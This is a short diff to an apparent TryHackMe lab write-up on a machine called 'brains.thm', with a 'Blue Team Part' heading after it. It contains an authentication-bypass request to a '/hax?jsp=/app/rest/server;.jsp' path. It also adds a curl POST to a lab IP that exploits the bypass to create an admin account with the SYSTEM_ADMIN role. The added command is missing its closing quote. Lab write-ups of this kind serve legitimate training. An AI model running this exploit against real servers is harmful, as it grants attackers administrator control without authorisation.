@@ -164,6 +164,11 @@ By using the authentication bypass vulnerability, we can successfully call this 
 curl -ik 'http://brains.thm:50000/hax?jsp=/app/rest/server;.jsp'
 ```
 
+![](attachments/Pasted%20image%2020251101200012.png)
+
+```bash
+curl -ik http://10.201.34.50:50000/hax?jsp=/app/rest/server;.jsp -X POST -H "Content-Type: application/json" --data "{\"username\": \"0xjohn\", \"password\": \"0xjohn\", \"email\": \"0xb0b\", \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}}
+```
 ---
 
 ### Blue Team Part
